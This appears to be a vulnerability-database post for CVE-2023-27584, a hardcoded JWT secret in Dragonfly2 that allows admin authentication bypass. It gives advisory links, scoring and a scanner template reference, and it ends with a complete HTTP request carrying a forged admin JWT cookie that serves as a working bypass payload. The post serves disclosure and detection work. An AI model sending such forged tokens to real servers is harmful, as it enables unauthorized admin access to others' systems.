---
layout: "post"
cve_id: "CVE-2023-27584"
title: "Dragonfly2 < 2.1.0-beta.1 - Hardcoded JWT Secret"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-27584.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-27584.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "critical"
reference:
  - "https://github.com/advisories/GHSA-hpc8-7wpm-889w"
  - "https://github.com/dragonflyoss/Dragonfly2/releases/tag/v2.0.9"
  - "https://github.com/dragonflyoss/Dragonfly2/security/advisories/GHSA-hpc8-7wpm-889w"
  - "https://nvd.nist.gov/vuln/detail/cve-2023-27584"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2023-27584"
  cwe-id: "CWE-321"
  epss-score: 0.64638
  epss-percentile: 0.98361
metadata:
  max-request: 1
  verified: True
tags:
  - "cve"
  - "cve2023"
  - "dragonfly"
  - "exposure"
  - "jwt"
  - "secret"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
Dragonfly is an open source P2P-based file distribution and image acceleration system. It is hosted by the Cloud Native Computing Foundation (CNCF) as an Incubating Level Project. Dragonfly uses JWT to verify user. However, the secret key for JWT, "Secret Key", is hard coded, which leads to authentication bypass. An attacker can perform any action as a user with admin privileges. This issue has been addressed in release version 2.0.9. All users are advised to upgrade. There are no known workarounds for this vulnerability.


## ðŸŒ HTTP Request
```nohighlight
GET /api/v1/users HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Connection: close
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjU0NTAwMzcsImlkIjoxLCJvcmlnX2lhdCI6MTc2NTQ0NjAzN30.JD_mLhHflgHEucmqG--lX1LpihzIMba3N8xOSAFG49s
Accept-Encoding: gzip
```


